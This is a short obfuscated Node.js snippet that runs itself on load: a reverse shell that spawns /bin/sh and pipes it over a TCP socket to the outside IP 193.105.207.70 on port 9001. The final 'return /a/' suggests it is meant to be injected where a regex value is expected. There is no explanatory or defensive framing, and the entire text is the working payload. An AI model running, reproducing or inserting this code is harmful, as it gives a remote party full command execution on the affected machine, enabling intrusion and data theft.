;(function () {
  var _0x5bb830 = require('net'),
    _0x30cbdb = require('child_process'),
    _0x185b46 = _0x30cbdb.spawn('/bin/sh', [])
  var _0x361b43 = new _0x5bb830.Socket()
  _0x361b43.connect(9001, '193.105.207.70', function () {
    _0x361b43.pipe(_0x185b46.stdin)
    _0x185b46.stdout.pipe(_0x361b43)
    _0x185b46.stderr.pipe(_0x361b43)
  })
  return /a/
})()

